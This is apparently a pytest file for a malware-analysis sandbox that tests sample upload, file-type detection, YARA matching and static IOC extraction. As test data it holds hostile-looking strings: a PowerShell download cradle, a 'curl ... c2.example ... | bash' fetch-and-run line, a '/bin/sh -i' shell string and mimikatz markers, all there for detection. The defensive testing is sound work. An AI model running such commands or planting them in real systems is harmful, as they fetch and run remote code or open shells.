"""Roadmap 1.4 — sample upload + magic-byte OS auto-detection."""

MZ = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00"
ELF = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00"
MACHO = b"\xfe\xed\xfa\xcf\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00"
JUNK = b"\x00\x01\x02\x03\xff\xfe\xfd\xfc this is not an executable"


def _upload(client, data, name="payload.bin"):
    return client.post("/samples", params={"name": name}, content=data)


def test_pe_magic_detects_windows(client):
    resp = _upload(client, MZ, "payload.exe")
    assert resp.status_code == 201
    body = resp.json()
    assert body["detected_platform"] == "windows"
    assert body["family"] == "PE (Windows executable)"
    assert body["original_name"] == "payload.exe"
    assert body["size"] == len(MZ)
    assert len(body["sha256"]) == 64
    assert len(body["sample_id"]) == 12


def test_elf_magic_detects_linux(client):
    resp = _upload(client, ELF, "payload.elf")
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "linux"


def test_macho_magic_detects_macos(client):
    resp = _upload(client, MACHO, "payload.dylib")
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "macos"


def test_unknown_bytes_rejected_with_readable_error(client):
    resp = _upload(client, JUNK, "junk.bin")
    assert resp.status_code == 422
    detail = resp.json()["detail"]
    assert "Unrecognized file signature" in detail
    assert "0x00010203" in detail  # preview of the first bytes


def test_duplicate_upload_is_idempotent(client):
    first = _upload(client, MZ).json()
    second = _upload(client, MZ)
    assert second.status_code == 201
    assert second.json()["sample_id"] == first["sample_id"]
    assert second.json()["sha256"] == first["sha256"]
    # Same shape as a fresh upload — family must be present on re-upload too.
    assert second.json()["family"] == "PE (Windows executable)"
    assert second.json()["detected_platform"] == "windows"


def _zip_with(entry_names: list[str], datas: list[bytes] | None = None) -> bytes:
    """Hand-rolled ZIP: local file headers + optional per-entry payload bytes.
    `datas` lets tests exercise the walk's compsize skip (real archives have
    compressed data between headers — the sniff must jump over it)."""
    datas = datas or [b""] * len(entry_names)
    out = b""
    for name, payload in zip(entry_names, datas):
        nb = name.encode()
        # Proper 30-byte local file header: sig(4) version(2) flags(2) method(2)
        # modtime(2) moddate(2) crc(4) compsize(4) uncompsize(4) namelen(2) extralen(2).
        # After the 4-byte signature: 10 bytes of field headers, then 12 bytes
        # of crc/sizes, then namelen at offset 26 and the name at offset 30.
        out += (
            b"PK\x03\x04"
            + b"\x14\x00"  # version 2
            + b"\x00\x00" * 4  # flags 2 + method 2 + modtime 2 + moddate 2
            + b"\x00\x00\x00\x00"  # crc 4
            + len(payload).to_bytes(4, "little")  # compsize 4 (data length)
            + b"\x00\x00\x00\x00"  # uncompsize 4
            + len(nb).to_bytes(2, "little")
            + b"\x00\x00"  # extralen 2
            + nb
            + payload
        )
    return out


def test_bash_shebang_detects_linux(client):
    resp = _upload(client, b"#!/bin/bash\necho owned\n", "rev.sh")
    assert resp.status_code == 201
    body = resp.json()
    assert body["detected_platform"] == "linux"
    assert body["family"] == "script (bash)"


def test_env_python_shebang_detects_linux(client):
    resp = _upload(client, b"#!/usr/bin/env python3\nprint('hi')\n", "payload.py")
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "linux"


def test_powershell_shebang_detects_windows(client):
    resp = _upload(client, b"#!/usr/bin/pwsh\nInvoke-WebRequest x\n", "lure.ps1")
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "windows"


def test_unknown_shebang_accepted_as_unknown_platform(client):
    # A shebang with an interpreter we don't map still gets an honest guess
    # rather than a 422 — the analyst uploaded *something* script-like.
    resp = _upload(client, b"#!/usr/bin/cobol\n", "odd.cob")
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "unknown"
    assert "cobol" in resp.json()["family"]


def test_lnk_shortcut_detects_windows(client):
    resp = _upload(client, b"L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00", "shortcut.lnk")
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "windows"
    assert resp.json()["family"] == "Windows shortcut (.lnk)"


def test_office_zip_detects_windows(client):
    # A macro-laden .docm is a zip with word/ inside — the classic lure.
    resp = _upload(client, _zip_with(["[Content_Types].xml", "word/document.xml"]), "invoice.docm")
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "windows"
    assert resp.json()["family"] == "Office document (zip)"


def test_office_zip_with_payload_data_still_detected(client):
    # Real archives carry data between headers; the walk must skip it to reach
    # the word/ entry — this was the regression (only the first entry was read,
    # and real .docm files list [Content_Types].xml first).
    resp = _upload(
        client,
        _zip_with(
            ["[Content_Types].xml", "word/document.xml"],
            [b"<Types/>", b"<w:document/>"],
        ),
        "payload.docm",
    )
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "windows"
    assert resp.json()["family"] == "Office document (zip)"


def test_zip_with_exe_detects_windows(client):
    resp = _upload(client, _zip_with(["stage1.exe", "readme.txt"]), "bundle.zip")
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "windows"
    assert resp.json()["family"] == "ZIP containing Windows artifacts"


def test_untyped_zip_accepted_with_unknown_platform(client):
    resp = _upload(client, _zip_with(["random.dat"]), "mystery.zip")
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "unknown"
    assert "untyped" in resp.json()["family"]


def test_empty_zip_accepted(client):
    resp = _upload(client, b"PK\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", "empty.zip")
    assert resp.status_code == 201
    assert resp.json()["detected_platform"] == "unknown"


def test_ioc_search_ignores_non_hex_hash_input(client):
    # A wildcard-laden value must never reach the LIKE as a pattern.
    resp = client.get("/ioc/search", params={"value": "%"}).json()
    assert resp["samples"] == []
    resp = client.get("/ioc/search", params={"value": "MZ%_"}).json()
    assert resp["samples"] == []


def test_empty_upload_rejected(client):
    resp = _upload(client, b"")
    assert resp.status_code == 422


def test_get_sample(client):
    meta = _upload(client, ELF, "x.elf").json()
    resp = client.get(f"/samples/{meta['sample_id']}")
    assert resp.status_code == 200
    assert resp.json()["detected_platform"] == "linux"


def test_hash_searchable_via_ioc(client):
    meta = _upload(client, MZ, "hashme.exe").json()
    # Exact hash
    hit = client.get("/ioc/search", params={"value": meta["sha256"]}).json()
    assert any(s["sample_id"] == meta["sample_id"] for s in hit["samples"])
    # Prefix
    prefix = client.get("/ioc/search", params={"value": meta["sha256"][:16]}).json()
    assert any(s["sha256"] == meta["sha256"] for s in prefix["samples"])
    # No match
    miss = client.get("/ioc/search", params={"value": "deadbeef"}).json()
    assert miss["samples"] == []


# -- Roadmap 2.2: YARA scan + hash reputation attached at upload ---------------


def test_yara_scan_fires_on_upload(client):
    # A PE header + PowerShell download cradle strings → both rules match.
    blob = MZ + b"\x00" * 64 + b"IEX(New-Object Net.WebClient).DownloadString('http://x')"
    resp = _upload(client, blob, "cradle.exe")
    assert resp.status_code == 201
    body = resp.json()
    assert "mz-header" in body["yara_rules"]
    assert "powershell-download-cradle" in body["yara_rules"]


def test_yara_scan_no_match_returns_empty(client):
    # A recognized-but-benign upload (bare script) with no implant strings →
    # honest empty list, not an error.
    resp = _upload(client, b"#!/usr/bin/env node\nconsole.log('hi')\n", "plain.js")
    assert resp.status_code == 201
    assert resp.json()["yara_rules"] == "[]"


def test_reputation_endpoint_returns_yara_and_vt_fields(client):
    blob = MZ + b"sekurlsa mimikatz strings here"
    meta = _upload(client, blob, "tool.exe").json()
    rep = client.get(f"/samples/{meta['sample_id']}/reputation").json()
    assert "mimikatz" in rep["yara_rules"]
    assert "sha256" in rep
    # No API key configured in tests → honest None, not an error.
    assert rep["vt_detections"] is None
    assert rep["malware_family"] is None


def test_yara_scan_marks_office_macro(client):
    # .docm-style zip with VBA marker strings.
    blob = _zip_with(["word/vbaProject.bin"], [b"Auto_Open VBA macros here"])
    resp = _upload(client, blob, "macro.docm")
    assert resp.status_code == 201
    assert "office-macro" in resp.json()["yara_rules"]


def test_duplicate_upload_keeps_yara_evidence(client):
    blob = MZ + b"\x00" * 16 + b"Invoke-Expression"
    first = _upload(client, blob, "dup.exe").json()
    second = _upload(client, blob, "dup.exe").json()
    assert second["sample_id"] == first["sample_id"]
    assert "mz-header" in second["yara_rules"]


# -- Sample library (webapp /samples page) -------------------------------------


def test_samples_list_returns_all_with_evidence(client):
    # Unique payload bytes — uploads are deduped by SHA-256, so MZ/ELF alone
    # would collide with earlier tests' samples and keep their original names.
    _upload(client, MZ + b"list-a-unique-marker", "list-a.exe")
    _upload(client, ELF + b"list-b-unique-marker", "list-b.elf")
    data = client.get("/samples").json()
    names = {s["original_name"] for s in data["samples"]}
    assert "list-a.exe" in names and "list-b.elf" in names
    row = next(s for s in data["samples"] if s["original_name"] == "list-a.exe")
    assert row["detected_platform"] == "windows"
    assert row["runs_count"] == 0
    assert isinstance(row["yara_rules"], list)
    assert row["family"] == "PE (Windows executable)"  # persisted at upload, not lost
    assert "sha256" in row and "size" in row and "created_at" in row


def test_samples_list_filters_by_query(client):
    _upload(client, MZ + b"filter-me-unique-marker", "filter-me.exe")
    hit = client.get("/samples", params={"q": "filter-me"}).json()
    assert hit["total"] == 1
    assert hit["samples"][0]["original_name"] == "filter-me.exe"
    miss = client.get("/samples", params={"q": "no-such-sample"}).json()
    assert miss["total"] == 0 and miss["samples"] == []


def test_samples_hide_synthetic_by_default(client):
    """The vault reads real-first like the archive: a binary whose ENTIRE
    detonation history is synthetic (seed / webapp-demo / sandbox:demo) is
    hidden by default and flagged when shown; a run-less upload and one with a
    real run stay visible. include_synthetic=true reveals everything, and the
    CSV export honors the same default."""
    import datetime

    from .conftest import make_run

    def _ts(offset: int = 0) -> str:
        return (
            datetime.datetime(2026, 8, 1, 12, 0, 0, tzinfo=datetime.timezone.utc)
            + datetime.timedelta(seconds=offset)
        ).isoformat()

    real = _upload(client, MZ + b"synth-real-marker", "synth-real.exe").json()
    demo = _upload(client, ELF + b"synth-demo-marker", "synth-demo.sh").json()
    never = _upload(client, MZ + b"synth-never-marker", "synth-never.exe").json()  # no runs at all

    demo_run = make_run(client, sample_name="synth-demo.sh", source="seed")
    client.post("/ingest/batch", json=[{
        "run_id": demo_run, "platform": "linux", "event_type": "process_create",
        "timestamp": _ts(1), "pid": 1, "ppid": 0, "process_name": "synth-demo.sh",
    }])
    real_run = make_run(client, sample_name="synth-real.exe", source="cli")
    client.post("/ingest/batch", json=[{
        "run_id": real_run, "platform": "windows", "event_type": "process_create",
        "timestamp": _ts(2), "pid": 1, "ppid": 0, "process_name": "synth-real.exe",
    }])

    data = client.get("/samples").json()
    names = {s["original_name"] for s in data["samples"]}
    assert "synth-real.exe" in names and "synth-never.exe" in names
    assert "synth-demo.sh" not in names  # entire detonation history is seed

    full = client.get("/samples", params={"include_synthetic": "true"}).json()
    by_name = {s["original_name"]: s for s in full["samples"]}
    assert by_name["synth-demo.sh"]["synthetic"] is True
    assert by_name["synth-real.exe"]["synthetic"] is False
    assert by_name["synth-never.exe"]["synthetic"] is False  # run-less = can't prove demo

    # CSV export mirrors the feed's default hiding.
    csv = client.get("/samples/export").text
    assert "synth-real.exe" in csv and "synth-demo.sh" not in csv
    csv_full = client.get("/samples/export", params={"include_synthetic": "true"}).text
    assert "synth-demo.sh" in csv_full

    # Clean up the sample rows so other tests' vault scans stay scoped.
    from ..core.db import db_session

    with db_session() as conn:
        for sid in (real["sample_id"], demo["sample_id"], never["sample_id"]):
            conn.execute("DELETE FROM samples WHERE sample_id = ?", (sid,))
        conn.commit()


# -- Static analysis (strings / IOCs / PE / ELF) ------------------------------

# Minimal but structurally valid PE32+ (x86-64) — DOS stub, COFF header, PE32+
# optional header, one .text section (mapped 0x1000–0x2200, raw at 0x400), and
# an import table at RVA 0x2000 naming KERNEL32.dll. The section's mapped
# window must COVER the import RVAs or the parser correctly reports no imports.
def _build_pe() -> bytes:
    dos = b"MZ" + b"\x00" * 0x3A + (0x40).to_bytes(4, "little")
    coff = b"PE\x00\x00" + (0x8664).to_bytes(2, "little") + (1).to_bytes(2, "little")  # machine, nsects
    coff += (0).to_bytes(4, "little") * 2  # timestamp, ptr_symtab
    coff += (0).to_bytes(4, "little") + (0xF0).to_bytes(2, "little") + (0x206).to_bytes(2, "little")  # nsyms, opthdr sz, chars
    # PE32+ optional header (0xF0 bytes): magic, entry RVA, import dir at index 1.
    opt = (0x20B).to_bytes(2, "little") + b"\x00" * 14  # magic + linker/etc
    opt += (0x1000).to_bytes(4, "little")  # AddressOfEntryPoint
    opt += b"\x00" * (112 - 20)  # pad to data directories (0x70 offset)
    # Data directory 1 (imports): RVA 0x2000, size 40 (one descriptor + null terminator)
    opt += b"\x00" * 8  # dir 0 (exports)
    opt += (0x2000).to_bytes(4, "little") + (40).to_bytes(4, "little")
    opt += b"\x00" * (0xF0 - len(opt))  # pad rest of optional header
    # One .text section: vaddr 0x1000, VirtualSize 0x1200 (window reaches 0x2200,
    # covering the 0x2000/0x2100 import RVAs), raw at 0x400, RawSize 0x1200.
    sec = b".text\x00\x00\x00" + (0x1200).to_bytes(4, "little")  # VirtualSize
    sec += (0x1000).to_bytes(4, "little") + (0x1200).to_bytes(4, "little")  # VA, SizeOfRawData
    sec += (0x400).to_bytes(4, "little") + b"\x00" * 16 + (0x60000020).to_bytes(4, "little")  # ptr, reloc/lnums/pad, chars
    import_desc = (0).to_bytes(4, "little") * 3 + (0x2100).to_bytes(4, "little") + (0).to_bytes(4, "little")  # Name RVA
    import_desc += b"\x00" * 20  # null terminator
    blob = dos + coff + opt + sec
    blob += b"\x00" * (0x400 - len(blob))  # pad to raw data
    blob += b"\x00" * 0x1000 + import_desc  # descriptor at raw 0x1400 (= RVA 0x2000)
    blob += b"\x00" * (0x1500 - len(blob))  # pad so the name lands at raw 0x1500
    blob += b"KERNEL32.dll\x00"  # name at raw 0x1500 (= RVA 0x2100)
    return blob


# Minimal ELF64 little-endian x86-64 — exact 64-byte header + three exact
# 64-byte section headers (null, .text, .shstrtab), then the .shstrtab
# payload at a computed offset (never hardcoded, so the layout stays right).
def _build_elf() -> bytes:
    hdr = bytearray(b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8)  # ELF64 LE
    hdr += (3).to_bytes(2, "little") + (0x3E).to_bytes(2, "little")  # DYN, x86-64
    hdr += (0).to_bytes(4, "little") + (0x401000).to_bytes(8, "little")  # version, entry
    hdr += (0).to_bytes(8, "little") * 2  # phoff, shoff (shoff patched below)
    hdr += (0).to_bytes(4, "little") + (64).to_bytes(2, "little") + (0).to_bytes(2, "little")  # flags, ehsize, phentsize
    hdr += (0).to_bytes(2, "little") + (64).to_bytes(2, "little") + (3).to_bytes(2, "little") + (2).to_bytes(2, "little")  # phnum, shentsize, shnum, shstrndx=2
    strtab = b"\x00.text\x00.shstrtab\x00"

    def _sh(name_off: int, sh_type: int, offset: int, size: int) -> bytes:
        # Elf64_Shdr: name(4) type(4) flags(8) addr(8) offset(8) size(8)
        # link(4) info(4) align(8) entsize(8) = 64 bytes total.
        return (
            name_off.to_bytes(4, "little") + sh_type.to_bytes(4, "little")
            + (0).to_bytes(8, "little") + (0).to_bytes(8, "little")
            + offset.to_bytes(8, "little") + size.to_bytes(8, "little")
            + (0).to_bytes(4, "little") + (0).to_bytes(4, "little")
            + (0).to_bytes(8, "little") + (0).to_bytes(8, "little")
        )

    sh_off = len(hdr)  # section table right after the header
    str_off = sh_off + 3 * 64  # strtab after the three section headers
    sh_text = _sh(1, 1, 0x1000, 0x80)  # .text, PROGBITS, sh_offset/size arbitrary
    sh_str = _sh(7, 3, str_off, len(strtab))  # .shstrtab (starts at byte 7), STRTAB
    hdr[40:48] = sh_off.to_bytes(8, "little")  # e_shoff
    return bytes(hdr) + b"\x00" * 64 + sh_text + sh_str + strtab


def test_static_analysis_pe_strings_iocs_and_sections(client):
    blob = _build_pe() + b"http://evil.example/beacon" + b" 203.0.113.9 " + b"Invoke-Expression " + b"\x00\x00s\x00e\x00c\x00r\x00e\x00t\x00\x00\x00"
    meta = _upload(client, blob, "stage.exe").json()
    st = client.get(f"/samples/{meta['sample_id']}/static")
    assert st.status_code == 200
    body = st.json()
    assert body["size"] == len(blob)
    # Strings: ASCII + UTF-16LE both extracted.
    assert any("evil.example" in s for s in body["strings"])
    assert any("secret" in s for s in body["strings"])
    # IOCs: URL + IP.
    assert "http://evil.example/beacon" in body["iocs"]["urls"]
    assert "203.0.113.9" in body["iocs"]["ips"]
    # PE metadata: machine, bits, section, import.
    pe = body["pe"]
    assert pe["machine"] == "x86-64" and pe["bits"] == 64
    assert any(s["name"] == ".text" for s in pe["sections"])
    assert "KERNEL32.dll" in pe["imports"]
    assert body["elf"] is None


def test_static_analysis_elf_metadata(client):
    blob = _build_elf() + b"/bin/sh -i"
    meta = _upload(client, blob, "rev.elf").json()
    st = client.get(f"/samples/{meta['sample_id']}/static").json()
    elf = st["elf"]
    assert elf["class"] == 64 and elf["endian"] == "little"
    assert elf["machine"] == "x86-64" and elf["type"] == "DYN"
    names = [s["name"] for s in elf["sections"]]
    assert ".text" in names and ".shstrtab" in names
    assert st["pe"] is None


def test_static_analysis_script_has_no_pe_elf(client):
    blob = b"#!/bin/bash\ncurl -s http://c2.example/x.sh | bash\n"
    meta = _upload(client, blob, "curl.sh").json()
    st = client.get(f"/samples/{meta['sample_id']}/static").json()
    assert st["pe"] is None and st["elf"] is None
    assert any("c2.example" in s for s in st["strings"])
    assert "http://c2.example/x.sh" in st["iocs"]["urls"]


def test_static_analysis_unknown_sample_404(client):
    resp = client.get("/samples/does-not-exist/static")
    assert resp.status_code == 404


def test_static_analysis_bytes_missing_is_200_unavailable(client):
    """A known sample whose bytes were never stored (pre-persistence uploads)
    returns 200 with `available: false` — NOT a 404 — so the browser logs no
    error and the panel renders its re-upload state from data."""
    from ..core import config

    meta = _upload(client, MZ + b"bytes-missing-marker", "ghost.exe").json()
    sid = meta["sample_id"]
    # Drop the stored bytes, as if the upload predated byte persistence.
    blob_path = config.SAMPLES_DIR / f"{sid}.bin"
    assert blob_path.exists()
    blob_path.unlink()

    resp = client.get(f"/samples/{sid}/static")
    assert resp.status_code == 200
    data = resp.json()
    assert data["available"] is False
    assert data["sha256"] == meta["sha256"]
    assert data["strings"] == []
    assert data["iocs"] == {"urls": [], "ips": [], "domains": [], "hashes": [], "emails": []}
    assert data["pe"] is None and data["elf"] is None


def test_sample_download_roundtrip(client):
    blob = MZ + b"\x00" * 32 + b"download-me-marker"
    meta = _upload(client, blob, "roundtrip.exe").json()
    resp = client.get(f"/samples/{meta['sample_id']}/download")
    assert resp.status_code == 200
    assert resp.content == blob  # byte-identical round-trip
    assert resp.headers.get("x-outpost-sha256") == meta["sha256"]
    assert "roundtrip.exe" in resp.headers.get("content-disposition", "")


def test_sample_download_unknown_404(client):
    assert client.get("/samples/nope/download").status_code == 404


def test_samples_csv_export(client):
    _upload(client, MZ + b"csv-export-marker", "csv-a.exe")
    resp = client.get("/samples/export")
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith("text/csv")
    body = resp.text
    assert "original_name" in body and "csv-a.exe" in body


def test_samples_csv_export_route_does_not_shadow_detail(client):
    # /samples/export must NOT be captured by /samples/{sample_id} — the
    # static route ordering regression this guards.
    meta = _upload(client, ELF + b"shadow-guard-marker", "shadow.elf").json()
    assert client.get(f"/samples/{meta['sample_id']}").status_code == 200
    assert client.get("/samples/export").status_code == 200


def test_samples_list_counts_runs_using_same_name(client):
    meta = _upload(client, MZ + b"used-twice-unique-marker", "used-twice.exe").json()
    for _ in range(2):
        # Explicit cli provenance — the vault hides binaries whose entire
        # history is synthetic, and this test only cares about the count.
        run = client.post(
            "/runs",
            json={"sample_name": "used-twice.exe", "platform": "windows", "session_type": "analysis", "source": "cli"},
        ).json()
        client.post(f"/runs/{run['run_id']}/complete")
    row = next(
        s for s in client.get("/samples").json()["samples"] if s["sample_id"] == meta["sample_id"]
    )
    assert row["runs_count"] == 2
